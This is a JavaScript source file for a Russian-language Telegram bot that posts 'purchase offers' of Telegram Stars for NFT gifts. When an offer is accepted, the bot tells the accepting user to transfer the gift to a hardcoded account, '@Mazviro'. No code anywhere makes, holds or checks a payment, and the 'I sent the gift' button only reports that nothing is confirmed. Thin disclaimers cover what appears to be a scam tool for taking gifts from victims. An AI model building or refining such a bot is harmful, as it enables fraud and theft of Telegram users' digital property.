
import { InlineKeyboard } from "grammy";
import { randomBytes } from "node:crypto";

const RECEIVER = "@Mazviro";
const offers = new Map();

function parseGift(input) {
  try {
    let link = input.trim();

    if (!/^https?:\/\//i.test(link)) {
      link = "https://" + link;
    }

    const url = new URL(link);

    if (!["t.me", "telegram.me", "www.t.me"].includes(
      url.hostname.toLowerCase()
    )) return null;

    const match = url.pathname.match(
      /^\/nft\/([A-Za-z0-9_-]+)-(\d+)\/?$/
    );

    if (!match) return null;

    const name = match[1]
      .replace(/([a-z])([A-Z])/g, "$1 $2")
      .replace(/([A-Z]+)([A-Z][a-z])/g, "$1 $2");

    return {
      url: `https://t.me/nft/${match[1]}-${match[2]}`,
      name: `${name} #${match[2]}`
    };
  } catch {
    return null;
  }
}

function makeId() {
  return randomBytes(6).toString("hex");
}

export function registerCommands(bot) {

  bot.command("start", async (ctx) => {
    await ctx.reply(
      "🎁 NFT Offers\n\n" +
      "Создание предложений о покупке NFT.\n\n" +
      "Введите:\n" +
      "/offer t.me/nft/JoyfulBundle-30358 484"
    );
  });

  bot.command("offer", async (ctx) => {
    if (ctx.chat.type !== "private") {
      return ctx.reply(
        "Используйте команду в личном чате с ботом."
      );
    }

    const parts = ctx.message.text.trim().split(/\s+/);

    if (parts.length !== 3) {
      return ctx.reply(
        "❌ Неверный формат.\n\n" +
        "/offer t.me/nft/JoyfulBundle-30358 484"
      );
    }

    const gift = parseGift(parts[1]);
    const price = Number(parts[2]);

    if (!gift) {
      return ctx.reply(
        "❌ Некорректная ссылка на NFT-подарок."
      );
    }

    if (
      !/^[1-9]\d*$/.test(parts[2]) ||
      !Number.isSafeInteger(price)
    ) {
      return ctx.reply(
        "❌ Укажите корректную цену."
      );
    }

    const id = makeId();

    const offer = {
      gift,
      price,
      status: "active",
      acceptedBy: null,
      expiresAt: Date.now() + 86400000
    };

    offers.set(id, offer);

    const buyer =
      ctx.from.first_name || "Пользователь";

    const keyboard = new InlineKeyboard()
      .text("✅ Принять", `accept:${id}`)
      .text("❌ Отклонить", `reject:${id}`);

    await ctx.reply(
      `🎁 Предложение о покупке NFT\n\n` +
      `${buyer} предлагает ${price} ⭐ ` +
      `за ${gift.name}.\n\n` +
      `Срок действия: 24 часа.\n\n` +
      `Ссылка: ${gift.url}\n\n` +
      `Это предложение пользователя, ` +
      `оплата не подтверждена.`,
      {
        reply_markup: keyboard,
        link_preview_options: {
          is_disabled: false,
          url: gift.url,
          prefer_large_media: true,
          show_above_text: false
        }
      }
    );
  });

  bot.callbackQuery(/^accept:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (!offer) {
      return ctx.answerCallbackQuery({
        text: "Предложение не найдено.",
        show_alert: true
      });
    }

    if (Date.now() > offer.expiresAt) {
      offer.status = "expired";
      return ctx.answerCallbackQuery({
        text: "Срок действия предложения истёк.",
        show_alert: true
      });
    }

    if (offer.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение уже обработано.",
        show_alert: true
      });
    }

    offer.status = "accepted";
    offer.acceptedBy = ctx.from.id;

    await ctx.answerCallbackQuery({
      text: "✅ Предложение принято.",
      show_alert: true
    });

    const keyboard = new InlineKeyboard()
      .text(
        "✅ Я передал подарок",
        `sent:${ctx.match[1]}`
      );

    await ctx.reply(
      `🎁 Предложение принято\n\n` +
      `Подарок: ${offer.gift.name}\n` +
      `Цена предложения: ${offer.price} ⭐\n\n` +
      `Указанный получатель: ${RECEIVER}\n\n` +
      `Перед передачей подарка убедитесь, ` +
      `что условия оплаты согласованы и ` +
      `получатель проверен.\n\n` +
      `⚠️ Бот не подтверждает оплату ` +
      `и не гарантирует получение звёзд.`,
      { reply_markup: keyboard }
    );
  });

  bot.callbackQuery(/^reject:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (!offer || offer.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    offer.status = "rejected";

    await ctx.answerCallbackQuery({
      text: "❌ Предложение отклонено.",
      show_alert: true
    });
  });

  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async (ctx) => {
    const offer = offers.get(ctx.match[1]);

    if (
      !offer ||
      offer.status !== "accepted" ||
      offer.acceptedBy !== ctx.from.id
    ) {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    await ctx.answerCallbackQuery({
      text: "❌ Передача подарка не подтверждена.",
      show_alert: true
    });
  });
}
